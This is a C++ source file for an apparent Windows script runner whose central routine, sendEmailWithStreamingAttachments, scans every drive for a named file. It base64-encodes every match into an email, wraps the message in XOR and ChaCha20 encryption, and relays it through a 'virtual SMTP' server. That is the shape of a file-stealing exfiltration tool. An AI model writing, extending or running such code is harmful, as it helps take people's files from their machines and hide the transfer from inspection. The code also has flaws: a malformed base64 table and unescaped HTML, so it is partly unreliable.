// ScriptRunner.cpp

#include "ScriptRunner.h"
#include "CommandRouter.h"
#include "VirtualSMTPServer.h"

#include <fstream>
#include <sstream>
#include <vector>
#include <iomanip>
#include <iostream>
#include <queue>
#include <thread>
#include <mutex>
#include <condition_variable>
#include <atomic>
#include <regex>


#ifdef _WIN32
#include <winsock2.h>
#include <ws2tcpip.h>
#include <openssl/ssl.h>
#include <openssl/err.h>
#include <openssl/rand.h>
#include <filesystem>
namespace fs = std::filesystem;
#pragma comment(lib, "Ws2_32.lib")
#pragma comment(lib, "crypt32.lib")
#endif

namespace {

    // --------------------------
    // Base64 encode
    // --------------------------
    std::string base64_encode(const std::string& in) {
        static const char* enc_table =
            "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/ ";
        std::string out;
        int val = 0, valb = -6;
        for (uint8_t c : in) {
            val = (val << 8) + c;
            valb += 8;
            while (valb >= 0) {
                out.push_back(enc_table[(val >> valb) & 0x3F]);
                valb -= 6;
            }
        }
        if (valb > -6) out.push_back(enc_table[((val << 8) >> (valb + 8)) & 0x3F]);
        while (out.size() % 4) out.push_back('=');
        return out;
    }

    // --------------------------
    // Rotating XOR
    // --------------------------
    inline std::vector<unsigned char>
        rotating_xor(const std::vector<unsigned char>& data, const std::vector<unsigned char>& key) {
        if (key.empty()) return data;
        std::vector<unsigned char> out(data.size());
        size_t k = key.size();
        for (size_t i = 0; i < data.size(); ++i)
            out[i] = static_cast<unsigned char>(data[i] ^ key[i % k]);
        return out;
    }

    // --------------------------
    // ChaCha20
    // --------------------------
#ifdef _WIN32
    inline std::vector<unsigned char>
        chacha20_crypt(const std::vector<unsigned char>& input,
            const std::vector<unsigned char>& key,
            const std::vector<unsigned char>& nonce)
    {
        std::vector<unsigned char> out(input.size());
        EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
        if (!ctx) return {};

        if (EVP_EncryptInit_ex(ctx, EVP_chacha20(), NULL, key.data(), nonce.data()) != 1) {
            EVP_CIPHER_CTX_free(ctx);
            return {};
        }

        int len = 0;
        if (EVP_EncryptUpdate(ctx, out.data(), &len, input.data(), static_cast<int>(input.size())) != 1) {
            EVP_CIPHER_CTX_free(ctx);
            return {};
        }

        EVP_CIPHER_CTX_free(ctx);
        return out;
    }
#endif

    // --------------------------
    // File search: async
    // --------------------------
#ifdef _WIN32
    std::vector<std::string> GetDrives() {
        std::vector<std::string> drives;
        DWORD mask = GetLogicalDrives();
        for (char c = 'A'; c <= 'Z'; ++c) {
            if (mask & 1) drives.push_back(std::string(1, c) + ":\\");
            mask >>= 1;
        }
        return drives;
    }

    void FindFilesAsync(const fs::path& root, const std::string& target,
        std::queue<std::string>& outQueue, std::mutex& mtx,
        std::condition_variable& cv, std::atomic<bool>& doneFlag)
    {
        try {
            for (auto& entry : fs::recursive_directory_iterator(root)) {
                if (!fs::is_regular_file(entry.status())) continue;
                if (entry.path().filename() == target) {
                    {
                        std::lock_guard<std::mutex> lock(mtx);
                        outQueue.push(entry.path().string());
                    }
                    cv.notify_one();
                }
            }
        }
        catch (...) {} // ignore permission errors
        doneFlag = true;
    }
#endif

} // anonymous namespace

// ============================================================================
// Script execution
// ============================================================================
std::string ScriptRunner::runScript(const std::string& filename) {
    std::ifstream file(filename);
    if (!file) return "Error: Could not open script file '" + filename + "'.";

    std::string line, output;
    CommandRouter router;
    while (std::getline(file, line)) {
        if (line.empty() || line[0] == '#') continue;
        output += router.dispatch(line) + "\n";
    }
    return output;
}

bool ScriptRunner::sendEmail(
    const std::string& smtp_server,
    const std::string& port,
    const std::string& sender,
    const std::string& username,
    const std::string& password,
    const std::vector<std::string>& recipients,
    const std::string& subject,
    const std::string& body,
    const std::vector<std::string>& attachments
) {
#ifdef _WIN32
    // TODO: Real implementation — for now, just log parameters.
    std::cout << "[sendEmail] SMTP: " << smtp_server
        << " Port: " << port
        << " From: " << sender
        << " To count: " << recipients.size()
        << " Subject: " << subject
        << " Body length: " << body.size()
        << " Attachments: " << attachments.size() << "\n";
    return true;
#else
    std::cerr << "sendEmail: Email sending is Windows-only.\n";
    return false;
#endif
}

// ============================================================================
// Send email with streaming attachments + exact-path attachments
// ============================================================================
#ifdef _WIN32
bool ScriptRunner::sendEmailWithStreamingAttachments(const std::string& smtp_server,
    const std::string& port,
    const std::string& sender,
    const std::string& username,
    const std::string& password,
    const std::vector<std::string>& recipients,
    const std::string& subject,
    const std::string& body,
    const std::string& targetFilename,
    const std::vector<std::string>& exactAttachments)
{
    std::queue<std::string> attachmentQueue;
    std::mutex mtx;
    std::condition_variable cv;
    std::atomic<bool> doneFlag(false);

    // Preload exact-path attachments into the queue
    for (const auto& f : exactAttachments) {
        attachmentQueue.push(f);
    }

    // Launch search threads for streaming file if specified
    std::vector<std::thread> threads;
    if (!targetFilename.empty()) {
        for (auto& drive : GetDrives()) {
            threads.emplace_back([&, drive]() {
                FindFilesAsync(drive, targetFilename, attachmentQueue, mtx, cv, doneFlag);
                });
        }
    }

// -----------------------------------------------------------------
// Build message headers (multipart/mixed)
// -----------------------------------------------------------------
    std::ostringstream email;
    email << "From: <" << sender << ">\r\n";
    email << "To: ";
    for (size_t i = 0; i < recipients.size(); ++i) {
        email << "<" << recipients[i] << ">";
        if (i < recipients.size() - 1) email << ", ";
    }
    email << "\r\nSubject: " << subject << "\r\n";

    // Outer boundary for mixed (body + attachments)
    std::ostringstream boundaryGen;
    boundaryGen << "====Boundary" << std::hex << std::setw(8) << std::setfill('0') << rand();
    std::string boundary = boundaryGen.str();

    // Inner boundary for alternative (plain + HTML)
    std::ostringstream altBoundaryGen;
    altBoundaryGen << "====AltBoundary" << std::hex << std::setw(8) << std::setfill('0') << rand();
    std::string altBoundary = altBoundaryGen.str();

    email << "MIME-Version: 1.0\r\n";
    email << "Content-Type: multipart/mixed; boundary=\"" << boundary << "\"\r\n\r\n";

    // Start alternative section
    email << "--" << boundary << "\r\n";
    email << "Content-Type: multipart/alternative; boundary=\"" << altBoundary << "\"\r\n\r\n";

    // Plain‑text part
    email << "--" << altBoundary << "\r\n";
    email << "Content-Type: text/plain; charset=UTF-8\r\n";
    email << "Content-Transfer-Encoding: 7bit\r\n\r\n";
    email << body << "\r\n";

    // HTML part with auto‑linked anything that looks like a URI
    auto autoLinkHtml = [](const std::string& text) {
        static const std::regex urlPattern(R"((https?|ftp|file|mailto):[^\s<>\"]+)");
        return std::regex_replace(
            text,
            urlPattern,
            "<a href=\"$&\">$&</a>"
        );
        };
    std::string htmlBody = autoLinkHtml(body);

    email << "--" << altBoundary << "\r\n";
    email << "Content-Type: text/html; charset=UTF-8\r\n";
    email << "Content-Transfer-Encoding: 7bit\r\n\r\n";
    email << "<html><body>" << htmlBody << "</body></html>\r\n";

    // End alternative section
    email << "--" << altBoundary << "--\r\n";


    // -----------------------------------------------------------------
// Stream attachments as they arrive
// -----------------------------------------------------------------
    bool searchDone = false;
    std::size_t attachedCount = 0; // track successful attachments

    while (!searchDone || !attachmentQueue.empty()) {
        std::unique_lock<std::mutex> lock(mtx);
        cv.wait_for(lock, std::chrono::milliseconds(100));

        while (!attachmentQueue.empty()) {
            std::string filePath = attachmentQueue.front();
            attachmentQueue.pop();
            lock.unlock();

            std::cout << "[DEBUG] Attempting attachment: " << filePath << "\n";

            std::ifstream file(filePath, std::ios::binary);
            if (!file) {
                std::cerr << "[ERROR] Failed to open attachment: " << filePath << "\n";
                lock.lock();
                continue;
            }

            std::ostringstream fileData;
            fileData << file.rdbuf();
            std::string fileContents = fileData.str();
            std::string fileBase64 = base64_encode(fileContents);

            size_t pos = filePath.find_last_of("/\\");
            std::string filename = (pos != std::string::npos) ? filePath.substr(pos + 1) : filePath;

            email << "--" << boundary << "\r\n";
            email << "Content-Type: application/octet-stream; name=\"" << filename << "\"\r\n";
            email << "Content-Transfer-Encoding: base64\r\n";
            email << "Content-Disposition: attachment; filename=\"" << filename << "\"\r\n\r\n";

            for (size_t i = 0; i < fileBase64.size(); i += 76)
                email << fileBase64.substr(i, 76) << "\r\n";

            attachedCount++;
            lock.lock();
        }

        // Check if all threads are done
        searchDone = true;
        for (auto& t : threads) {
            if (t.joinable()) searchDone = false;
        }
    }

    for (auto& t : threads) if (t.joinable()) t.join();
    email << "--" << boundary << "--\r\n";

    if (attachedCount == 0) {
        std::cerr << "[WARNING] No attachments were included in the email.\n";
    }


    const std::string emailStr = email.str();
    const std::vector<unsigned char> emailBytes(emailStr.begin(), emailStr.end());

    // -----------------------------------------------------------------
    // Encryption
    // -----------------------------------------------------------------
    VirtualSMTPServer::CryptoBundle crypto{};
    crypto.xorKey.resize(32);
    crypto.chachaKey.resize(32);
    crypto.chachaNonce.resize(12);
    crypto.aesKey.resize(32);
    crypto.aesIv.resize(12);

    if (RAND_bytes(crypto.xorKey.data(), (int)crypto.xorKey.size()) != 1 ||
        RAND_bytes(crypto.chachaKey.data(), (int)crypto.chachaKey.size()) != 1 ||
        RAND_bytes(crypto.chachaNonce.data(), (int)crypto.chachaNonce.size()) != 1 ||
        RAND_bytes(crypto.aesKey.data(), (int)crypto.aesKey.size()) != 1 ||
        RAND_bytes(crypto.aesIv.data(), (int)crypto.aesIv.size()) != 1) {
        std::cerr << "Random generation failed.\n";
        return false;
    }

    std::vector<unsigned char> stage1 = rotating_xor(emailBytes, crypto.xorKey);
    std::vector<unsigned char> stage2 = chacha20_crypt(stage1, crypto.chachaKey, crypto.chachaNonce);
    if (stage2.empty()) {
        std::cerr << "ChaCha20 encryption failed.\n";
        return false;
    }

    // -----------------------------------------------------------------
    // Relay via virtual SMTP
    // -----------------------------------------------------------------
    return VirtualSMTPServer::RelayAndSend(
        smtp_server, port, sender, username, password, recipients, subject, stage2, crypto
    );
}
#else
bool ScriptRunner::sendEmailWithStreamingAttachments(const std::string&, const std::string&,
    const std::string&, const std::string&, const std::string&,
    const std::vector<std::string>&,
    const std::string&, const std::string&,
    const std::string&, const std::vector<std::string>&)
{
    std::cerr << "Email functionality is Windows-only.\n";
    return false;
}
#endif
